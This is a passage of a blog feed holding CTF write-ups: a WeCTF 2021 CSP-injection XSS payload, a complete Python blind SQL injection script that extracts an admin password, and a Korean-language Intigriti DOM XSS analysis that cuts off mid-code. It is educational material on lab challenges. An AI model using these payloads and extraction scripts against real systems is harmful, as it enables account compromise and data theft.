href="https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets">https://portswigger.net/research</a><br><br><em>Reference</em> : <a href="https://www.bugbountytips.tech/">https://www.bugbountytips.tech/</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CheatSheet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WeCTF 2021 Write Up</title>
      <link href="2021/06/21/2021-06-21-We-CTF-2021/"/>
      <url>2021/06/21/2021-06-21-We-CTF-2021/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-CSP-1-335-pts"><a href="#Web-CSP-1-335-pts" class="headerlink" title="(Web) CSP 1 [335 pts]"></a>(Web) CSP 1 [335 pts]</h2><blockquote><p>The CSP 1 challenge is stealing the admin cookie using xss. Buf, Have to bypass csp to try xss.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, make_response</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> bs</span><br><span class="line"><span class="keyword">from</span> peewee <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">db = SqliteDatabase(<span class="string">&quot;core.db&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Post</span>(<span class="params">Model</span>):</span></span><br><span class="line">    <span class="built_in">id</span> = AutoField()</span><br><span class="line">    token = CharField()</span><br><span class="line">    content = TextField()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        database = db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@db.connection_context()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initialize</span>():</span></span><br><span class="line">    db.create_tables([Post])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">initialize()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/write&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>():</span></span><br><span class="line">    content = request.form[<span class="string">&quot;content&quot;</span>]</span><br><span class="line">    token = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">    Post.create(token=token, content=content)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/display/&quot;</span> + token)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter_url</span>(<span class="params">urls</span>):</span></span><br><span class="line">    domain_list = []</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        domain = urllib.parse.urlparse(url).scheme + <span class="string">&quot;://&quot;</span> + urllib.parse.urlparse(url).netloc</span><br><span class="line">        <span class="keyword">if</span> domain:</span><br><span class="line">            domain_list.append(domain)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot; &quot;</span>.join(domain_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/display/&lt;token&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">token</span>):</span></span><br><span class="line">    user_obj = Post.select().where(Post.token == token)</span><br><span class="line">    content = user_obj[-<span class="number">1</span>].content <span class="keyword">if</span> <span class="built_in">len</span>(user_obj) &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&quot;Not Found&quot;</span></span><br><span class="line">    img_urls = [x[<span class="string">&#x27;src&#x27;</span>] <span class="keyword">for</span> x <span class="keyword">in</span> bs(content).find_all(<span class="string">&quot;img&quot;</span>)]</span><br><span class="line">    tmpl = render_template(<span class="string">&quot;display.html&quot;</span>, content=content)</span><br><span class="line">    resp = make_response(tmpl)</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-Security-Policy&quot;</span>] = <span class="string">&quot;default-src &#x27;none&#x27;; connect-src &#x27;self&#x27;; img-src &quot;</span> \</span><br><span class="line">                                              <span class="string">f&quot;&#x27;self&#x27; <span class="subst">&#123;filter_url(img_urls)&#125;</span>; script-src &#x27;none&#x27;; &quot;</span> \</span><br><span class="line">                                              <span class="string">&quot;style-src &#x27;self&#x27;; base-uri &#x27;self&#x27;; form-action &#x27;self&#x27; &quot;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>You check the CSP header setting part in <code>/display/&lt;token&gt;</code>, you can see that the option of <code>img-src</code> is set as the value of <code>&#123;filter_url(img_urls)&#125;</code>. By default, the option of <code>script-src</code> is set to <code>none</code>, So the script cannot be executed. However, You can put any value we want in the CSP header, if we give <code>script-src</code> as <code>unsafe-eval</code>, we can execute the inline script.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://*; script-src &#x27;unsafe-inline&#x27;&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">resp.headers[<span class="string">&quot;Content-Security-Policy&quot;</span>] = <span class="string">&quot;default-src &#x27;none&#x27;; connect-src &#x27;self&#x27;; img-src &quot;</span> \</span><br><span class="line">                                          <span class="string">f&quot;&#x27;self&#x27; https://*; script-src &#x27;unsafe-inline&#x27;; script-src &#x27;none&#x27;; &quot;</span> \</span><br><span class="line">                                          <span class="string">&quot;style-src &#x27;self&#x27;; base-uri &#x27;self&#x27;; form-action &#x27;self&#x27; &quot;</span></span><br></pre></td></tr></table></figure><p>So, if you just pass the image tag as above, CSP is set up as above and you can execute the inline script. Using this, run the script with <code>onerror</code> and read the flag.</p><blockquote><p>FLAG : we{2bf90f00-f560-4aee-a402-d46490b53541@just_L1k3_<sq1_injEcti0n>}</p></blockquote><hr><h2 id="Web-Phish-592-pts"><a href="#Web-Phish-592-pts" class="headerlink" title="(Web) Phish [592 pts]"></a>(Web) Phish [592 pts]</h2><blockquote><p>The Phish challenge is getting the password using the simple sql injection.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">from</span> peewee <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">db = SqliteDatabase(<span class="string">&quot;core.db&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="params">Model</span>):</span></span><br><span class="line">    <span class="built_in">id</span> = AutoField()</span><br><span class="line">    password = CharField()</span><br><span class="line">    username = CharField(unique=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        database = db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@db.connection_context()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initialize</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        db.create_tables([User])</span><br><span class="line">        User.create(username=<span class="string">&quot;shou&quot;</span>, password=os.getenv(<span class="string">&quot;FLAG&quot;</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">initialize()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/add&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>():</span></span><br><span class="line">    username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">    password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">    sql = <span class="string">f&quot;INSERT INTO `user`(password, username) VALUES (&#x27;<span class="subst">&#123;password&#125;</span>&#x27;, &#x27;<span class="subst">&#123;username&#125;</span>&#x27;)&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        db.execute_sql(sql)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Err: <span class="subst">&#123;sql&#125;</span> &lt;br&gt;&quot;</span> + <span class="built_in">str</span>(e)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Your password is leaked :)&lt;br&gt;&quot;</span> + \</span><br><span class="line">           <span class="string">&quot;&quot;&quot;&lt;blockquote class=&quot;imgur-embed-pub&quot; lang=&quot;en&quot; data-id=&quot;WY6z44D&quot;  &gt;&lt;a href=&quot;//imgur.com/WY6z44D&quot;&gt;Please </span></span><br><span class="line"><span class="string">        take care of your privacy&lt;/a&gt;&lt;/blockquote&gt;&lt;script async src=&quot;//s.imgur.com/min/embed.js&quot; </span></span><br><span class="line"><span class="string">        charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>The challenge description says that the password for the <code>shou</code> user is a flag, so you cat leak the <code>shou</code> password. Since Are using SQLite, You can do SQLite injection. However, I tried Time Based SQL Injection, but strangely it said that the <code>sqlite_sleep()</code> and <code>sqlite3_sleep()</code> functions could not be found. fuck</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class User(Model):</span><br><span class="line">    id &#x3D; AutoField()</span><br><span class="line">    password &#x3D; CharField()</span><br><span class="line">    username &#x3D; CharField(unique&#x3D;True)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        database &#x3D; db</span><br></pre></td></tr></table></figure><p>So I thought I would have to do Error Based Injection, so when I checked, I could see that the column was set as above. If you look at the username setting, you can see that <code>unique=True</code> is set. This is to prevent the use of duplicate values. This service is designed to prevent duplicate user account creation.</p><p>So, if the specific query statement is true, the user is sign up as an registered user, if the specific query statement is false, the user is sign up as an registered user, and an error occurs by <code>unique=True</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://phish.sf.ctf.so/add&quot;</span></span><br><span class="line">user1 = <span class="string">&#x27;aafaz&#x27;</span></span><br><span class="line">user2 = <span class="string">&#x27;baaff&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">d = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">        u, p = user1 + <span class="built_in">str</span>(d + <span class="number">1</span>), user2 + <span class="built_in">str</span>(d + <span class="number">1</span>)</span><br><span class="line">        payload = <span class="string">f&#x27;<span class="subst">&#123;u&#125;</span>\&#x27;), (\&#x27;f\&#x27;, (select case when (select unicode(substr(password,<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>,1)) from user where username = &quot;shou&quot;) = <span class="subst">&#123;j&#125;</span> THEN &quot;<span class="subst">&#123;p&#125;</span>&quot; ELSE &quot;pocas&quot; END)) --&#x27;</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>:payload, <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;dummy&#x27;</span>&#125;</span><br><span class="line">        res = requests.post(url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Your password is leaked&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">            password += <span class="built_in">chr</span>(j)</span><br><span class="line">            log.info(<span class="string">&#x27;Admin password : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(password))</span><br><span class="line">            d = d + <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        d = d + <span class="number">1</span></span><br></pre></td></tr></table></figure><p>I wrote the exploit code as above.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[*] Admin password : we&#123;</span><br><span class="line">[*] Admin password : we&#123;e</span><br><span class="line">[*] Admin password : we&#123;e0</span><br><span class="line">(...)</span><br><span class="line">[*] Admin password : we&#123;e0df7105-edcd-4dc6-8349-f3bef83643a9@h0P3_u_didnt_u3e_sq1</span><br><span class="line">[*] Admin password : we&#123;e0df7105-edcd-4dc6-8349-f3bef83643a9@h0P3_u_didnt_u3e_sq1m</span><br><span class="line">[*] Admin password : we&#123;e0df7105-edcd-4dc6-8349-f3bef83643a9@h0P3_u_didnt_u3e_sq1m4</span><br><span class="line">[*] Admin password : we&#123;e0df7105-edcd-4dc6-8349-f3bef83643a9@h0P3_u_didnt_u3e_sq1m4P</span><br><span class="line">[*] Admin password : we&#123;e0df7105-edcd-4dc6-8349-f3bef83643a9@h0P3_u_didnt_u3e_sq1m4P&#125;</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : we{e0df7105-edcd-4dc6-8349-f3bef83643a9@h0P3_u_didnt_u3e_sq1m4P}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Intigriti 0121 Write Up</title>
      <link href="2021/06/12/2021-06-12-Intigriti-0121/"/>
      <url>2021/06/12/2021-06-12-Intigriti-0121/</url>
      
        <content type="html"><![CDATA[<h2 id="Descriptions"><a href="#Descriptions" class="headerlink" title="Descriptions"></a>Descriptions</h2><p>Intigriti 0121 문제는 Dom Based XSS 취약점을 이용해서 XSS를 트리거 하는 문제이다.</p><hr><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>소스 코드들 확인해 보면 <code>script.js</code> 파일을 랜더링 해오는 것을 볼 수 있다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">window</span>.href = <span class="keyword">new</span> URL(<span class="built_in">window</span>.location.href);</span><br><span class="line"><span class="built_in">window</span>.r = href.searchParams.get(<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="comment">//Remove malicious values from href, redirect, referrer, name, ...</span></span><br><span class="line">[<span class="string">&quot;document&quot;</span>, <span class="string">&quot;window&quot;</span>].forEach(<span class="function"><span class="keyword">function</span>(<span class="params">interface</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">Object</span>.keys(<span class="built_in">window</span>[interface]).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">globalVariable</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>((<span class="keyword">typeof</span> <span class="built_in">window</span>[interface][globalVariable] == <span class="string">&quot;string&quot;</span>) &amp;&amp; (<span class="built_in">window</span>[interface][globalVariable].indexOf(<span class="string">&quot;javascript&quot;</span>) &gt; -<span class="number">1</span>))&#123;</span><br><span class="line">          <span class="keyword">delete</span> <span class="built_in">window</span>[interface][globalVariable];</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> links = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; links.length; i++)&#123;</span><br><span class="line">    links[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">      e.preventDefault();</span><br><span class="line">      safeRedirect(e.target.href);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(r != <span class="literal">undefined</span>)&#123;</span><br><span class="line">  safeRedirect(r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeRedirect</span>(<span class="params">url</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!url.match(<span class="regexp">/[&lt;&gt;&quot;&#x27; ]/</span>))&#123;</span><br><span class="line">    <span class="built_in">window</span>.setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(url.startsWith(<span class="string">&quot;https://&quot;</span>))&#123;</span><br><span class="line">          <span class="built_in">window</span>.location = url;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123; <span class="comment">//local redirect</span></span><br><span class="line">          <span class="built_in">window</span>.location = <span class="built_in">window</span>.origin + <span class="string">&quot;/&quot;</span> + url;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">window</span>.setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="built_in">document</span>.getElementById(<span class="string">&quot;error&quot;</span>).style.display = <span class="string">&quot;block&quot;</span>;</span><br><span class="line">        &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;, <span class="number">5000</span>);</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;popover&quot;</span>).innerHTML = <span class="string">`</span></span><br><span class="line"><span class="string">      &lt;p&gt;You&#x27;re being redirected to <span class="subst">$&#123;url&#125;</span> in 5 seconds...&lt;/p&gt;</span></span><br><span class="line"><span class="string">      &lt;p id=&quot;error&quot; style=&quot;display:none&quot;&gt;</span></span><br><span class="line"><span class="string">        If you&#x27;re not being redirected, click &lt;a href=<span class="subst">$&#123;url&#125;</span>&gt;here&lt;/a&gt;</span></span><br><span class="line"><span class="string">      &lt;/p&gt;.`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    alert(<span class="string">&quot;Invalid URL.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>script.js</code>의 코드는 위와 같다. 일단 위에서 부터 차근 차근 분석을 진행하기로 했다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.href = <span class="keyword">new</span> URL(<span class="built_in">window</span>.location.href);</span><br><span class="line"><span class="built_in">window</span>.r = href.searchParams.get(<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="comment">//Remove malicious values from href, redirect, referrer, name, ...</span></span><br><span class="line">[<span class="string">&quot;document&quot;</span>, <span class="string">&quot;window&quot;</span>].forEach(<span class="function"><span class="keyword">function</span>(<span class="params">interface</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">Object</span>.keys(<span class="built_in">window</span>[interface]).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">globalVariable</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>((<span class="keyword">typeof</span> <span class="built_in">window</span>[interface][globalVariable] == <span class="string">&quot;string&quot;</span>) &amp;&amp; (<span class="built_in">window</span>[interface][globalVariable].indexOf(<span class="string">&quot;javascript&quot;</span>) &gt; -<span class="number">1</span>))&#123;</span><br><span class="line">          <span class="keyword">delete</span> <span class="built_in">window</span>[interface][globalVariable];</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>제일 먼저 <code>UR</code>L 객체를 생성하고, <code>searchParams</code> 메서드를 이용해서 <code>r</code>라는 파리미터의 값을 가져오는 것을 볼 수 있다. 그 후에 <code>forEach</code> 문을 이용해서 전역 변수(r)가 문자열이고, <code>&quot;javascript&quot;</code>라는 문자열이 있으면 해당 객체 전체를 삭제하는 것을 볼 수 있다. <code>javascript</code> 스키마 사용을 방지하고 있는 거 같은데 그냥 <code>JavAscriPt</code>와 같이 대문자를 섞어 주면 쉽게 우회할 수 있다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> links = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; links.length; i++)&#123;</span><br><span class="line">    links[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">      e.preventDefault();</span><br><span class="line">      safeRedirect(e.target.href);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>다음은 페이지에서 <code>onload</code> 메서드가 실행이 되면 a 태그를 가져와 <code>safeRediect()</code> 함수로 <code>url</code>을 넘겨주는 것을 볼 수 있다. 그리고 끝이다. 이 부분은 많이 중요하지 않다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(r != <span class="literal">undefined</span>)&#123;</span><br><span class="line">    safeRedirect(r);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">safeRedirect</span>(<span class="params">url</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!url.match(<span class="regexp">/[&lt;&gt;&quot;&#x27; ]/</span>))&#123;</span><br><span class="line">      <span class="built_in">window</span>.setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="keyword">if</span>(url.startsWith(<span class="string">&quot;https://&quot;</span>))&#123;</span><br><span class="line">            <span class="built_in">window</span>.location = url;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span>&#123; <span class="comment">//local redirect</span></span><br><span class="line">            <span class="built_in">window</span>.location = <span class="built_in">window</span>.origin + <span class="string">&quot;/&quot;</span> + url;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">window</span>.setTimeout(<span 